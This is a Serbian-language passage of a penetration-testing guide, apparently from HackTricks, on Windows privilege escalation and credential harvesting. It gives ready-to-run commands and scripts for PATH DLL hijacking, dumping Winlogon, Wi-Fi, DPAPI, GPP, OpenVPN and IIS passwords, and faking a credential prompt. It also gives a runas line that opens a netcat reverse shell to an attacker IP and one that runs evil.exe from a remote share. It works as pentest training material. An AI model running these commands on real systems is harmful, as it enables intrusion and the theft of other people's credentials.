**Proveri da li možeš da prepišeš neki registar ili binarni fajl koji će biti izvršen od strane drugog korisnika.**\
**Pročitaj** sledeću **stranicu** da saznaš više o zanimljivim **lokacijama autorun-a za eskalaciju privilegija**:

{% content-ref url="privilege-escalation-with-autorun-binaries.md" %}
[privilege-escalation-with-autorun-binaries.md](privilege-escalation-with-autorun-binaries.md)
{% endcontent-ref %}

### Drajveri

Potraži moguće **treće strane čudne/vulnerabilne** drajvere

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

## PATH DLL Hijacking

Ako imate **dozvole za pisanje unutar foldera koji se nalazi na PATH-u**, možda ćete moći da preuzmete kontrolu nad DLL-om koji učitava proces i **povećate privilegije**.

Proverite dozvole svih foldera unutar PATH-a:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Za više informacija o tome kako zloupotrebiti ovu proveru:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

## Mreža

### Deljenja

```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```

### hosts fajl

Proverite da li postoje drugi poznati računari čvrsto navedeni u hosts fajlu

```
type C:\Windows\System32\drivers\etc\hosts
```

### Mrežni interfejsi i DNS

```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

### Otvoreni portovi

Proverite **ograničene usluge** spolja

```bash
netstat -ano #Opened ports?
```

### Tabela rutiranja

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### ARP Tabela

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Pravila Firewall-a

[**Proverite ovu stranicu za komande povezane sa Firewall-om**](../basic-cmd-for-pentesters.md#firewall) **(lista pravila, kreiranje pravila, isključivanje, isključivanje...)**

Više [komandi za enumeraciju mreže ovde](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem za Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Binarni `bash.exe` takođe se može pronaći u `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Ako dobijete root korisnika, možete osluškivati na bilo kojem portu (prvi put kada koristite `nc.exe` za osluškivanje na portu, zatražiće putem GUI-a da li je `nc` dozvoljen od strane firewall-a).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Da biste lako pokrenuli bash kao root, možete probati `--default-user root`

Možete istražiti `WSL` fajl sistem u folderu `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Kredencijali

### Winlogon Kredencijali

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

### Menadžer akreditacija / Windows trezor

Sa [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows trezor čuva korisničke akreditacije za servere, veb sajtove i druge programe za koje **Windows može automatski da prijavi korisnike**. Na prvi pogled, ovo može izgledati kao da korisnici mogu da sačuvaju svoje Facebook akreditacije, Twitter akreditacije, Gmail akreditacije itd., kako bi se automatski prijavljivali putem pretraživača. Ali to nije tako.

Windows trezor čuva akreditacije koje Windows može automatski da koristi za prijavljivanje korisnika, što znači da svaka **Windows aplikacija koja zahteva akreditacije za pristup resursu** (serveru ili veb sajtu) \*\*može koristiti ovaj Menadžer akreditacija i Windows trezor i koristiti dostavljene akreditacije umesto što korisnici stalno unose korisničko ime i lozinku.

Osim ako aplikacije ne interaguju sa Menadžerom akreditacija, ne mislim da je moguće da koriste akreditacije za određeni resurs. Dakle, ako vaša aplikacija želi da koristi trezor, nekako bi trebalo **da komunicira sa menadžerom akreditacija i zatraži akreditacije za taj resurs** iz podrazumevanog trezora za čuvanje.

Koristite `cmdkey` da biste prikazali sačuvane akreditacije na mašini.

```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```

Zatim možete koristiti `runas` sa opcijama `/savecred` kako biste koristili sačuvane akreditacije. Sledeći primer poziva udaljeni binarni fajl putem SMB deljenja.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Korišćenje `runas` sa pruženim setom akreditacija.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Napomena da se mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials\_file\_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault\_password\_view.html), ili iz [Empire Powershells modula](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)** pruža metod simetrične enkripcije podataka, uglavnom korišćen unutar Windows operativnog sistema za simetričnu enkripciju asimetričnih privatnih ključeva. Ova enkripcija koristi korisničku ili sistemsku tajnu kako bi značajno doprinela entropiji.

**DPAPI omogućava enkripciju ključeva kroz simetrični ključ koji se izvodi iz korisničkih prijava**. U scenarijima koji uključuju enkripciju sistema, koristi sistemsku tajnu za autentifikaciju domena.

Enkriptovani korisnički RSA ključevi, korišćenjem DPAPI-ja, čuvaju se u direktorijumu `%APPDATA%\Microsoft\Protect\{SID}`, gde `{SID}` predstavlja [Security Identifier](https://en.wikipedia.org/wiki/Security\_Identifier) korisnika. **DPAPI ključ, smešten zajedno sa glavnim ključem koji štiti korisničke privatne ključeve u istom fajlu**, obično se sastoji od 64 bajta slučajnih podataka. (Važno je napomenuti da je pristup ovom direktorijumu ograničen, sprečavajući listanje sadržaja putem `dir` komande u CMD-u, mada se može listati putem PowerShell-a).

```powershell
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Možete koristiti **mimikatz modul** `dpapi::masterkey` sa odgovarajućim argumentima (`/pvk` ili `/rpc`) da biste je dešifrovali.

**Datoteke sa kredencijalima zaštićene glavnom lozinkom** obično se nalaze u:

```powershell
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Možete koristiti **mimikatz modul** `dpapi::cred` sa odgovarajućim `/masterkey` za dešifrovanje.\
Možete **izvući mnogo DPAPI** **masterključeva** iz **memorije** pomoću modula `sekurlsa::dpapi` (ako ste root).

{% content-ref url="dpapi-extracting-passwords.md" %}
[dpapi-extracting-passwords.md](dpapi-extracting-passwords.md)
{% endcontent-ref %}

### PowerShell Kredencijali

**PowerShell kredencijali** se često koriste za **skriptovanje** i automatizaciju zadataka kao način čuvanja šifrovanih kredencijala na praktičan način. Kredencijali su zaštićeni pomoću **DPAPI**, što obično znači da ih može dešifrovati samo isti korisnik na istom računaru na kojem su kreirani.

Za **dešifrovanje** PS kredencijala iz datoteke koja ih sadrži, možete uraditi:

```powershell
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wifi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Sačuvane RDP konekcije

Možete ih pronaći na `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
i u `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Nedavno izvršene komande

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Upravljač lozinki za udaljenu radnu površinu**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Koristite **Mimikatz** `dpapi::rdg` modul sa odgovarajućim `/masterkey` da **dekriptujete bilo koje .rdg fajlove**.\
Možete **izvući mnogo DPAPI masterključeva** iz memorije pomoću Mimikatz `sekurlsa::dpapi` modula.

### Ljepljive beleške

Ljudi često koriste aplikaciju StickyNotes na Windows radnim stanicama da **sačuvaju lozinke** i druge informacije, ne shvatajući da je to baza podataka. Ovaj fajl se nalazi na putanji `C:\Users\<korisnik>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` i uvek je vredno pretražiti ga i pregledati.

### AppCmd.exe

**Imajte na umu da za oporavak lozinki iz AppCmd.exe morate biti Administrator i pokrenuti se sa visokim nivoom integriteta.**\
**AppCmd.exe** se nalazi u direktorijumu `%systemroot%\system32\inetsrv\`.\
Ako ovaj fajl postoji, moguće je da su neki **kredencijali** konfigurisani i mogu biti **oporavljeni**.

Ovaj kod je izvučen iz [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Proverite da li postoji `C:\Windows\CCM\SCClient.exe`.\
Instalateri se **pokreću sa PRIVILEGIJAMA SISTEMA**, mnogi su ranjivi na **DLL Sideloading (Informacije sa** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Fajlovi i Registar (Poverljivi podaci)

### Putty podaci

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

### Putty SSH Host Ključevi

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH ključevi u registru

SSH privatni ključevi mogu biti smešteni unutar registarskog ključa `HKCU\Software\OpenSSH\Agent\Keys`, stoga treba proveriti da li ima nečega zanimljivog tamo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ako pronađete bilo koji unos unutar te putanje, verovatno će biti sačuvan SSH ključ. Čuva se šifrovan, ali se lako može dešifrovati koristeći [https://github.com/ropnop/windows\_sshagent\_extract](https://github.com/ropnop/windows\_sshagent\_extract).\
Više informacija o ovoj tehnici možete pronaći ovde: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Ako `ssh-agent` servis nije pokrenut i želite da se automatski pokrene prilikom pokretanja sistema, pokrenite:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

{% hint style="info" %}
Izgleda da ova tehnika više nije validna. Pokušao sam da kreiram neke ssh ključeve, dodam ih sa `ssh-add` i prijavim se putem ssh na mašinu. Registar HKCU\Software\OpenSSH\Agent\Keys ne postoji i procmon nije identifikovao korišćenje `dpapi.dll` tokom autentifikacije asimetričnim ključem.
{% endhint %}

### Neprisutne datoteke

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Možete takođe pretražiti ove datoteke koristeći **metasploit**: _post/windows/gather/enum\_unattend_

Primer sadržaja:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```

### SAM & SYSTEM rezervne kopije

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

### Cloud Credentials

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Pretražite datoteku nazvanu **SiteList.xml**

### Keširana GPP lozinka

Ranije je postojala funkcija koja je omogućavala implementaciju prilagođenih lokalnih administratorskih naloga na grupi mašina putem grupne politike preferencija (GPP). Međutim, ovaj metod je imao značajne sigurnosne propuste. Prvo, objekti grupne politike (GPO), smešteni kao XML datoteke u SYSVOL-u, mogli su biti pristupljeni od strane bilo kog korisnika domena. Drugo, lozinke unutar ovih GPP-ova, enkriptovane sa AES256 korišćenjem javno dokumentovanog podrazumevanog ključa, mogle su biti dekriptovane od strane bilo kog autentifikovanog korisnika. Ovo je predstavljalo ozbiljan rizik, jer je moglo omogućiti korisnicima da steknu povišene privilegije.

Kako bi se umanjio ovaj rizik, razvijena je funkcija za skeniranje lokalno keširanih GPP datoteka koje sadrže polje "cpassword" koje nije prazno. Nakon pronalaska takve datoteke, funkcija dekriptuje lozinku i vraća prilagođeni PowerShell objekat. Ovaj objekat uključuje detalje o GPP-u i lokaciju datoteke, pomažući u identifikaciji i rešavanju ove sigurnosne ranjivosti.

Pretražite `C:\ProgramData\Microsoft\Group Policy\history` ili _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (pre Windows Viste)_ za ove datoteke:

* Groups.xml
* Services.xml
* Scheduledtasks.xml
* DataSources.xml
* Printers.xml
* Drives.xml

**Za dekripciju cPassword-a:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Korišćenje crackmapexec-a za dobijanje lozinki:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Konfiguracija

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```powershell
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Primer web.config sa kredencijalima:

```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```

### OpenVPN kredencijali

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Zapisi

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Zatražite pristupne podatke

Uvek možete **zatražiti od korisnika da unese svoje pristupne podatke ili čak pristupne podatke drugog korisnika** ako smatrate da ih može znati (primetite da je **direktno traženje** pristupnih podataka od klijenta zaista **rizično**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Moguća imena datoteka koja sadrže akreditive**

Poznate datoteke koje su nekada sadržavale **šifre** u **čistom tekstu** ili **Base64**.

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Pretražite sve predložene datoteke:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Kredencijali u RecycleBinu

Trebalo bi takođe proveriti Bin da biste pronašli kredencijale unutra

Za **oporavak lozinki** sačuvanih od strane nekoliko programa možete koristiti: [http://www.nirsoft.net/password\_recovery\_tools.html](http://www.nirsoft.net/password\_recovery\_tools.html)

### Unutar registra

**Drugi mogući registarski ključevi sa kredencijalima**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Izdvajanje openssh ključeva iz registra.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Istorija pregledača

Treba da proverite baze podataka gde su sačuvane lozinke iz **Chrome ili Firefox** pregledača.\
Takođe proverite istoriju, obeleživače i favorite pregledača jer se možda neke **lozinke** čuvaju tamo.

Alati za izdvajanje lozinki iz pregledača:

* Mimikatz: `dpapi::chrome`
* [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
* [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
* [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Prepisivanje COM DLL fajlova**

**Component Object Model (COM)** je tehnologija ugrađena u Windows operativni sistem koja omogućava **međusobnu komunikaciju** između softverskih komponenti različitih jezika. Svaka COM komponenta je **identifikovana putem ID klase (CLSID)**, a svaka komponenta izlaže funkcionalnost putem jednog ili više interfejsa, identifikovanih putem ID interfejsa (IID).

COM klase i interfejsi su definisani u registru pod **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** i **HKEY\_**_**CLASSES\_**_**ROOT\Interface**. Ovaj registar se kreira spajanjem **HKEY\_**_**LOCAL\_**_**MACHINE\Software\Classes** + **HKEY\_**_**CURRENT\_**_**USER\Software\Classes** = **HKEY\_**_**CLASSES\_**_**ROOT.**

Unutar CLSID ovog registra možete pronaći podregistrar **InProcServer32** koji sadrži **podrazumevanu vrednost** koja pokazuje na **DLL** i vrednost nazvanu **ThreadingModel** koja može biti **Apartment** (Jednonitno), **Free** (Višenitno), **Both** (Jedno ili Višenitno) ili **Neutral** (Niti Neutralne).

![](<../../.gitbook/assets/image (638).png>)

U osnovi, ako možete **prepisati bilo koji od DLL fajlova** koji će biti izvršeni, možete **povećati privilegije** ako taj DLL bude izvršen od strane drugog korisnika.

Da biste saznali kako napadači koriste COM preusmeravanje kao mehanizam upornosti, proverite:

{% content-ref url="com-hijacking.md" %}
[com-hijacking.md](com-hijacking.md)
{% endcontent-ref %}

### **Opšta pretraga lozinki u fajlovima i registru**

**Pretraga sadržaja fajlova**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Pretraga za fajl sa određenim imenom fajla**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Pretražite registar za imena ključeva i lozinke**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Alati koji traže lozinke

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) je msf dodatak koji sam kreirao kako bi automatski izvršavao svaki metasploit POST modul koji traži akreditive unutar žrtve.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatski traži sve datoteke koje sadrže lozinke navedene na ovoj stranici.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) je još jedan odličan alat za izvlačenje lozinki sa sistema.

Alat [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) traži sesije, korisnička imena i lozinke nekoliko alata koji čuvaju ove podatke u čistom tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP).

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Procureli Handleri

Zamislite da **proces koji se izvršava kao SISTEM otvara novi proces** (`OpenProcess()`) sa **puno pristupa**. Isti proces **takođe kreira novi proces** (`CreateProcess()`) **sa niskim privilegijama ali nasleđujući sve otvorene handle glavnog procesa**.\
Zatim, ako imate **puni pristup niskoprivilegovanom procesu**, možete dohvatiti **otvoreni handle privilegovanog procesa kreiranog** sa `OpenProcess()` i **ubaciti shellcode**.\
[Pročitajte ovaj primer za više informacija o **kako otkriti i iskoristiti ovu ranjivost**.](leaked-handle-exploitation.md)\
[Pročitajte ovaj **drugi post za detaljnije objašnjenje o tome kako testirati i zloupotrebiti više otvorenih handlera procesa i niti nasleđenih sa različitim nivoima dozvola (ne samo puni pristup)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Impersonacija Klijenta Imenovane Cevi

Deljeni segmenti memorije, nazvani **cevi**, omogućavaju komunikaciju procesa i prenos podataka.

Windows pruža mogućnost nazvanu **Imenovane Cevi**, omogućavajući nepovezanim procesima da dele podatke, čak i preko različitih mreža. Ovo podseća na arhitekturu klijent/server, sa ulogama definisanim kao **imenovani cev server** i **imenovani cev klijent**.

Kada se podaci šalju kroz cev od strane **klijenta**, **server** koji je postavio cev ima mogućnost da **preuzme identitet** **klijenta**, pod uslovom da ima neophodna **SeImpersonate** prava. Identifikovanje **privilegovanog procesa** koji komunicira putem cevi koju možete imitirati pruža priliku da **dobijete više privilegija** preuzimanjem identiteta tog procesa kada interaguje sa cevi koju ste uspostavili. Uputstva za izvođenje takvog napada mogu se naći [**ovde**](named-pipe-client-impersonation.md) i [**ovde**](./#from-high-integrity-to-system).

